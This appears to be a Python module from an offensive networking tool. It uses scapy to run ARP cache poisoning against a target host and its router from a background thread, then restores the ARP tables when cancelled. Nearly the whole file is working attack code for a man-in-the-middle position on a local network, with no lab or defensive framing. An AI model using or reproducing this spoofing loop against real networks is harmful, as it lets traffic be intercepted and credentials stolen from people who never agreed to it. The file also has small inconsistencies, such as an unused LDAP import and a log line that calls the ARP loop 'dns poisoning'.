import logging
import threading
import time

import scapy.all as scapy
from ldap3 import RESTARTABLE
from scapy.layers.l2 import arp_mitm
from networking_functions import get_mac

from colorama import init, Fore

init()
GREEN = Fore.GREEN
BLUE = Fore.BLUE
RED = Fore.RED
RESET = Fore.RESET


def restore_defaults(dest, source):
    """Restores default ARP settings"""
    target_mac = get_mac(dest)
    source_mac = get_mac(source)
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet, verbose=False)  # if its not restoring add count=4


def spoofing(target, spoofed):
    """Sends a spoofed ARP packet"""
    mac = get_mac(target)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    scapy.send(packet, verbose=False)


def arp_poisoning_loop(interface_to_poison, target_ip, router_ip, printing_queue, verbosity, cancel_token):
    if verbosity > 0:
        printing_queue.put(f"{GREEN}[+] Starting dns poisoning loop{RESET}")
        printing_queue.put(f"{GREEN}[+]Starting spoofing: {target_ip} <- {router_ip}{RESET}")
    while not cancel_token.is_set():
        try:
            # arp_mitm(router_ip, target_ip, iface=interface_to_poison)
            spoofing(target_ip, router_ip)
            spoofing(router_ip, target_ip)

            time.sleep(2)

        except OSError:
            if verbosity > 0:
                printing_queue.put(f'{RED}[?]IP seems down, retrying... {RESET}')
            time.sleep(1)
            continue
        except IndexError:
            if verbosity > 0:
                printing_queue.put(f'{RED}[?] Probably not resolving mac address{RESET}')
        except Exception as e:
            if verbosity > 0:
                printing_queue.put(f"{RED}[ERROR] {e}{RESET}")
            time.sleep(1)

    printing_queue.put(f"{GREEN}[+] Arp poisoning thread is exiting. Restoring default ARP settings...{RESET}")
    try:
        restore_defaults(target_ip, router_ip)
        restore_defaults(router_ip, target_ip)
        if verbosity > 0:
            printing_queue.put(f"{GREEN}[+] Default settings restored. Exiting.{RESET}")
    except Exception as e:
        printing_queue.put(f"{RED}[ERROR] {e}{RESET}")


def start_arp_poisoning(interface_to_poison, target_ip, router_ip, printing_queue, verbosity):
    cancel_token = threading.Event()
    if verbosity < 3:
        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    arp_poisoning_thread = threading.Thread(target=arp_poisoning_loop, args=(
        interface_to_poison, target_ip, router_ip, printing_queue, verbosity, cancel_token))
    arp_poisoning_thread.start()
    return cancel_token

# if __name__ == "__main__":
# arp_poisoning_loop("wlan0", )
